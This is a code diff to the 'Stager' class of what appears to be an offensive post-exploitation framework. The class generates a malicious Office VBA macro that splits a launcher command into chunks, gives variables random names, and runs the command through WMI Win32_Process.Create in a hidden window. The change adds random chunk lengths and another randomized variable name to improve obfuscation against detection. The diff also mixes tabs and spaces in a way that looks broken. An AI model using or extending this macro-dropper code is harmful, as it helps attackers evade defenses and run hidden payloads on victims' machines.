@@ -109,20 +109,25 @@ class Stager:
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
-        else:
-            launcher, noise = self.addnoise(launcher, noiselevel)         
-            chunks = list(helpers.chunks(launcher, 50))
-            LengthOfVari = random.randint(1,35)
+        else:	   
+	    LengthOfVari = random.randint(1,35)
+	    LengthOfChunks = random.randint(1,100)
+		
+            launcher, noise = self.addnoise(launcher, noiselevel)
+            chunks = list(helpers.chunks(launcher, LengthOfChunks))
+		
             Str = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
             NoiseMacVari = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
             Counter = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
             Method=''.join(random.choice(string.letters) for i in range(LengthOfVari))
-
+            strComputer=''.join(random.choice(string.letters) for i in range(LengthOfVari))
+		
             payload = "\tDim "+Str+" As String\n"
             payload += "\tDim "+NoiseMacVari+" As String\n"
             payload += "\tDim "+Counter+" As Integer\n"
             payload += "\t"+NoiseMacVari+" = \"" + noise + "\"\n"
             payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
+	
             for chunk in chunks[1:]:
                 payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
 
@@ -144,12 +149,12 @@ class Stager:
             macro += "Public Function "+Method+"() As Variant\n"
             macro += payload
             macro += "\tConst HIDDEN_WINDOW = 0\n"
-            macro += "\tstrComputer = \".\"\n"
-            macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n"
+            macro += "\t"+strComputer+" = \".\"\n"
+            macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & "+strComputer+" & \"\\root\\cimv2\")\n"
             macro += "\tSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n"
             macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
             macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
-            macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
+            macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & "+strComputer+" & \"\\root\\cimv2:Win32_Process\")\n"
             macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
             macro += "End Function\n"
             	    
